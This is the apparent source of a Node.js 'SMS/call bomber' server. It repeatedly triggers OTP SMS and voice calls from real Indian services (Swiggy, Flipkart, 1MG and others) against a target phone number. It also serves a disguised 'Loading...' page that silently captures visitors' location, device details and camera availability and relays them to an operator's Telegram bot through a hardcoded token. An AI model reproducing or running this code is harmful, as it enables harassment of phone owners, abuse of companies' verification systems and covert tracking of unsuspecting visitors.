const express = require('express');
const cors = require('cors');
const axios = require('axios');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const moment = require('moment');

require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5500;

// =============== TELEGRAM BOT ===============
const TELEGRAM_BOT_TOKEN = '7652922903:AAEhKa59S9VhVvUx3nQkKcFLy_lp6BFFl3I';
const TELEGRAM_ADMIN_ID = '6165863868';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// =============== MIDDLEWARE ===============
app.use(cors());
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static(path.join(__dirname, '/')));

// Create directories
const dirs = ['uploads', 'database'];
dirs.forEach(dir => {
    const dirPath = path.join(__dirname, dir);
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
});

// =============== DATABASE ===============
let database = {
    users: [],
    attacks: [],
    locations: [],
    media: [],
    visitors: []
};

const dbPath = path.join(__dirname, 'database', 'data.json');
try {
    if (fs.existsSync(dbPath)) {
        database = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        console.log(`✅ Loaded ${database.users.length} users`);
    }
} catch (error) {
    console.log('📁 New database created');
}

function saveDatabase() {
    fs.writeFileSync(dbPath, JSON.stringify(database, null, 2));
}

// =============== LOAD APIS ===============
let apisData = { apis: [] };
const apisPath = path.join(__dirname, 'apis.json');
try {
    if (fs.existsSync(apisPath)) {
        apisData = JSON.parse(fs.readFileSync(apisPath, 'utf8'));
        console.log(`✅ Loaded ${apisData.apis.length} APIs`);
    } else {
        // Create default APIs
        apisData = {
            apis: [
                {
                    "id": 1,
                    "name": "Tata Capital Call",
                    "type": "Call",
                    "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                    "method": "POST",
                    "headers": { "Content-Type": "application/json" },
                    "body": { "phone": "{phone}", "isOtpViaCallAtLogin": "true" },
                    "count": 5
                },
                {
                    "id": 2,
                    "name": "1MG Call",
                    "type": "Call",
                    "url": "https://www.1mg.com/auth_api/v6/create_token",
                    "method": "POST",
                    "headers": { "Content-Type": "application/json" },
                    "body": { "number": "{phone}", "otp_on_call": true },
                    "count": 5
                },
                {
                    "id": 3,
                    "name": "Swiggy Call",
                    "type": "Call",
                    "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
                    "method": "POST",
                    "headers": { "Content-Type": "application/json" },
                    "body": { "mobile": "{phone}" },
                    "count": 5
                },
                {
                    "id": 4,
                    "name": "Flipkart Call",
                    "type": "Call",
                    "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
                    "method": "POST",
                    "headers": { "Content-Type": "application/json" },
                    "body": { "mobile": "{phone}" },
                    "count": 5
                },
                {
                    "id": 5,
                    "name": "Zivame Call",
                    "type": "Call",
                    "url": "https://api.zivame.com/v2/customer/login/send-otp",
                    "method": "POST",
                    "headers": { "Content-Type": "application/json" },
                    "body": { "phone_number": "{phone}", "otp_type": "voice" },
                    "count": 5
                },
                {
                    "id": 6,
                    "name": "Lenskart SMS",
                    "type": "SMS",
                    "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
                    "method": "POST",
                    "headers": { "Content-Type": "application/json" },
                    "body": { "phoneCode": "+91", "telephone": "{phone}" },
                    "count": 5
                },
                {
                    "id": 7,
                    "name": "PharmEasy SMS",
                    "type": "SMS",
                    "url": "https://pharmeasy.in/api/v2/auth/send-otp",
                    "method": "POST",
                    "headers": { "Content-Type": "application/json" },
                    "body": { "phone": "{phone}" },
                    "count": 5
                }
            ]
        };
        fs.writeFileSync(apisPath, JSON.stringify(apisData, null, 2));
    }
} catch (error) {
    console.log('❌ Error loading APIs:', error.message);
}

// =============== TELEGRAM BOT COMMANDS (ADMIN ONLY) ===============
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_ADMIN_ID) return;
    
    bot.sendMessage(chatId, `
👋 *Welcome Admin!*

*Commands:*
/stats - View all statistics
/locations - Get recent locations
/media - View recent media
/users - List all users
/visitors - Recent visitors
/clear - Clear all data

*Total Stats:*
👥 Users: ${database.users.length}
📍 Locations: ${database.locations.length}
🖼️ Media: ${database.media.length}
⚡ Attacks: ${database.attacks.length}
    `, { parse_mode: 'Markdown' });
});

bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_ADMIN_ID) return;
    
    const today = moment().format('YYYY-MM-DD');
    const todayAttacks = database.attacks.filter(a => a.timestamp.startsWith(today)).length;
    
    const stats = `
📊 *COMPLETE STATISTICS*

👥 *Users:* ${database.users.length}
   ├─ Active Today: ${database.visitors.filter(v => v.timestamp.startsWith(today)).length}

📍 *Locations:* ${database.locations.length}
   ├─ Today: ${database.locations.filter(l => l.timestamp.startsWith(today)).length}
   └─ Unique Users: ${new Set(database.locations.map(l => l.userId)).size}

🖼️ *Media:* ${database.media.length}
   ├─ Images: ${database.media.filter(m => m.type === 'image').length}
   └─ Today: ${database.media.filter(m => m.timestamp.startsWith(today)).length}

⚡ *Attacks:* ${database.attacks.length}
   ├─ Today: ${todayAttacks}

🕐 *Last Update:* ${moment().format('DD/MM/YYYY HH:mm:ss')}
    `;
    
    bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
});

bot.onText(/\/locations/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_ADMIN_ID) return;
    
    const recent = database.locations.slice(-5).reverse();
    if (recent.length === 0) {
        bot.sendMessage(chatId, '📍 No locations yet');
        return;
    }
    
    recent.forEach((loc, i) => {
        const msg = `
📍 *Location ${i+1}*
👤 User: \`${loc.userId}\`
🌍 Lat: ${loc.latitude}
🌍 Lng: ${loc.longitude}
🎯 Accuracy: ${loc.accuracy || 'N/A'}m
📱 Device: ${loc.device || 'Unknown'}
🕐 ${moment(loc.timestamp).format('DD/MM/YYYY HH:mm:ss')}
🔗 [Google Maps](https://maps.google.com/?q=${loc.latitude},${loc.longitude})
        `;
        bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
        bot.sendLocation(chatId, loc.latitude, loc.longitude);
    });
});

bot.onText(/\/media/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_ADMIN_ID) return;
    
    const recent = database.media.slice(-3).reverse();
    if (recent.length === 0) {
        bot.sendMessage(chatId, '🖼️ No media yet');
        return;
    }
    
    recent.forEach(media => {
        if (media.type === 'image' && media.path && fs.existsSync(media.path)) {
            bot.sendPhoto(chatId, media.path, {
                caption: `📸 *Photo*\n👤 User: \`${media.userId}\`\n🕐 ${moment(media.timestamp).format('DD/MM/YYYY HH:mm:ss')}`,
                parse_mode: 'Markdown'
            });
        }
    });
});

bot.onText(/\/users/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_ADMIN_ID) return;
    
    let userList = '👥 *All Users*\n\n';
    database.users.slice(-10).forEach((u, i) => {
        userList += `${i+1}. \`${u.id}\` - Attacks: ${u.attacks || 0}\n`;
        userList += `   📍 ${moment(u.lastSeen || u.registeredAt).fromNow()}\n\n`;
    });
    
    bot.sendMessage(chatId, userList, { parse_mode: 'Markdown' });
});

bot.onText(/\/visitors/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_ADMIN_ID) return;
    
    let visitorList = '👥 *Recent Visitors*\n\n';
    database.visitors.slice(-10).reverse().forEach((v, i) => {
        visitorList += `${i+1}. \`${v.userId}\`\n`;
        visitorList += `   📱 ${v.userAgent || 'Unknown'}\n`;
        visitorList += `   🕐 ${moment(v.timestamp).fromNow()}\n\n`;
    });
    
    bot.sendMessage(chatId, visitorList, { parse_mode: 'Markdown' });
});

bot.onText(/\/clear/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_ADMIN_ID) return;
    
    database = { users: [], attacks: [], locations: [], media: [], visitors: [] };
    saveDatabase();
    bot.sendMessage(chatId, '✅ All data cleared');
});

// =============== API ENDPOINTS ===============

// Track visitor
app.post('/api/track', (req, res) => {
    const { userId, userAgent } = req.body;
    
    database.visitors.push({
        userId,
        userAgent,
        timestamp: new Date().toISOString(),
        ip: req.ip
    });
    
    let user = database.users.find(u => u.id === userId);
    if (!user) {
        user = {
            id: userId,
            attacks: 0,
            registeredAt: new Date().toISOString(),
            lastSeen: new Date().toISOString()
        };
        database.users.push(user);
        
        // Notify admin
        bot.sendMessage(TELEGRAM_ADMIN_ID, 
            `👤 *New Visitor*\n\nID: \`${userId}\`\nTime: ${moment().format('DD/MM/YYYY HH:mm:ss')}`,
            { parse_mode: 'Markdown' }
        );
    } else {
        user.lastSeen = new Date().toISOString();
    }
    
    saveDatabase();
    res.json({ success: true });
});

// Receive location (silent)
app.post('/api/location', (req, res) => {
    try {
        const { userId, latitude, longitude, accuracy, device } = req.body;
        
        const location = {
            userId,
            latitude,
            longitude,
            accuracy,
            device,
            timestamp: new Date().toISOString(),
            ip: req.ip
        };
        
        database.locations.push(location);
        saveDatabase();
        
        // Send to Telegram (only to admin)
        const locationMsg = `
📍 *New Location*
👤 User: \`${userId}\`
🌍 ${latitude}, ${longitude}
🎯 Accuracy: ${accuracy || 'N/A'}m
📱 ${device || 'Unknown'}
🕐 ${moment().format('DD/MM/YYYY HH:mm:ss')}
🔗 [Map](https://maps.google.com/?q=${latitude},${longitude})
        `;
        
        bot.sendMessage(TELEGRAM_ADMIN_ID, locationMsg, { parse_mode: 'Markdown' });
        bot.sendLocation(TELEGRAM_ADMIN_ID, latitude, longitude);
        
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

// Receive media (silent)
app.post('/api/media', (req, res) => {
    try {
        const { userId, type, data, filename, device } = req.body;
        
        let mediaPath = null;
        
        if (type === 'image' && data && data.startsWith('data:image')) {
            const base64Data = data.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            const filename2 = `${Date.now()}_${filename || 'photo.jpg'}`;
            mediaPath = path.join(__dirname, 'uploads', filename2);
            fs.writeFileSync(mediaPath, buffer);
            
            // Send to Telegram
            bot.sendPhoto(TELEGRAM_ADMIN_ID, buffer, {
                caption: `📸 *New Photo*\n👤 User: \`${userId}\`\n📱 ${device || 'Unknown'}\n🕐 ${moment().format('DD/MM/YYYY HH:mm:ss')}`,
                parse_mode: 'Markdown'
            });
        }
        
        const media = {
            userId,
            type,
            filename,
            path: mediaPath,
            device,
            timestamp: new Date().toISOString()
        };
        
        database.media.push(media);
        saveDatabase();
        
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

// Get APIs for bomber
app.get('/api/apis', (req, res) => {
    res.json({
        total: apisData.apis.length,
        apis: apisData.apis
    });
});

// Start attack
app.post('/api/attack', async (req, res) => {
    const { phone, duration, speed, userId } = req.body;
    
    console.log(`⚡ Attack: ${phone} by ${userId}`);
    
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
    });

    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    
    let totalRequests = 0;
    let successRequests = 0;
    let failedRequests = 0;
    
    const apisToUse = apisData.apis;
    const batchSize = speed === 5 ? apisToUse.length : Math.floor(apisToUse.length * (speed / 5));
    
    const attackInterval = setInterval(async () => {
        const now = Date.now();
        
        if (now >= endTime) {
            clearInterval(attackInterval);
            
            // Log attack
            database.attacks.push({
                userId,
                phone,
                duration,
                totalRequests,
                timestamp: new Date().toISOString()
            });
            
            const user = database.users.find(u => u.id === userId);
            if (user) user.attacks = (user.attacks || 0) + 1;
            
            saveDatabase();
            
            // Notify admin
            bot.sendMessage(TELEGRAM_ADMIN_ID, 
                `✅ *Attack Complete*\n👤 ${userId}\n📱 ${phone}\n⚡ ${totalRequests} requests\n🕐 ${duration}s`,
                { parse_mode: 'Markdown' }
            );
            
            try {
                res.write(`data: ${JSON.stringify({ type: 'end', total: totalRequests })}\n\n`);
                res.end();
            } catch (e) {}
            return;
        }

        // Call APIs
        const promises = [];
        for (let i = 0; i < batchSize; i++) {
            const api = apisToUse[i % apisToUse.length];
            for (let j = 0; j < (api.count || 1); j++) {
                promises.push(callApi(api, phone));
            }
        }

        const results = await Promise.allSettled(promises);
        
        results.forEach(result => {
            totalRequests++;
            if (result.status === 'fulfilled' && result.value) {
                successRequests++;
            } else {
                failedRequests++;
            }
        });

        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const progress = (elapsed / duration) * 100;
        const rps = elapsed > 0 ? (totalRequests / elapsed).toFixed(1) : 0;

        try {
            res.write(`data: ${JSON.stringify({
                type: 'update',
                total: totalRequests,
                success: successRequests,
                failed: failedRequests,
                progress,
                rps
            })}\n\n`);
        } catch (e) {}

    }, 1000);
});

// Call single API
async function callApi(api, phone) {
    try {
        let url = api.url.replace(/{phone}/g, phone);
        let data = null;
        
        if (api.body) {
            if (typeof api.body === 'string') {
                data = api.body.replace(/{phone}/g, phone);
            } else {
                data = {};
                for (let key in api.body) {
                    let value = api.body[key];
                    if (typeof value === 'string') {
                        value = value.replace(/{phone}/g, phone);
                    }
                    data[key] = value;
                }
            }
        }

        const response = await axios({
            method: api.method,
            url: url,
            headers: api.headers || {},
            data: data,
            timeout: 5000
        });

        return response.status >= 200 && response.status < 300;
        
    } catch (error) {
        return false;
    }
}

// User registration
app.post('/api/register', (req, res) => {
    const { userId } = req.body;
    
    let user = database.users.find(u => u.id === userId);
    
    if (!user) {
        user = {
            id: userId,
            attacks: 0,
            registeredAt: new Date().toISOString(),
            lastSeen: new Date().toISOString()
        };
        database.users.push(user);
        saveDatabase();
    } else {
        user.lastSeen = new Date().toISOString();
    }
    
    res.json({ success: true, user });
});

// Silent interceptor page
app.get('/i', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <style>
            body { 
                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: white;
                font-family: Arial;
                margin: 0;
            }
            .loader {
                border: 5px solid #f3f3f3;
                border-top: 5px solid #00ffff;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div style="text-align: center">
            <div class="loader"></div>
            <h2>Loading...</h2>
        </div>
        
        <script>
            // Silent data collection
            const userId = 'USER' + Math.floor(Math.random() * 1000000) + Date.now();
            
            // Send visitor info
            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    userId: userId,
                    userAgent: navigator.userAgent 
                })
            });
            
            // Get location silently
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        fetch('/api/location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                userId: userId,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                device: navigator.userAgent
                            })
                        });
                    },
                    (error) => {},
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }
            
            // Check for camera
            setTimeout(() => {
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    navigator.mediaDevices.enumerateDevices()
                        .then(devices => {
                            const hasCamera = devices.some(d => d.kind === 'videoinput');
                            if (hasCamera) {
                                fetch('/api/media', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        userId: userId,
                                        type: 'info',
                                        data: 'Camera available',
                                        device: navigator.userAgent
                                    })
                                });
                            }
                        })
                        .catch(() => {});
                }
            }, 3000);
        </script>
    </body>
    </html>
    `);
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔════════════════════════════════════════════════╗
║     🔥 SHAIQUA BOMBER IS RUNNING 🔥            ║
╚════════════════════════════════════════════════╝

📡 URL: http://localhost:${PORT}
📊 APIs: ${apisData.apis.length}
🤖 Bot: ✅ Active

📍 Intercept Page: http://localhost:${PORT}/i
    `);
});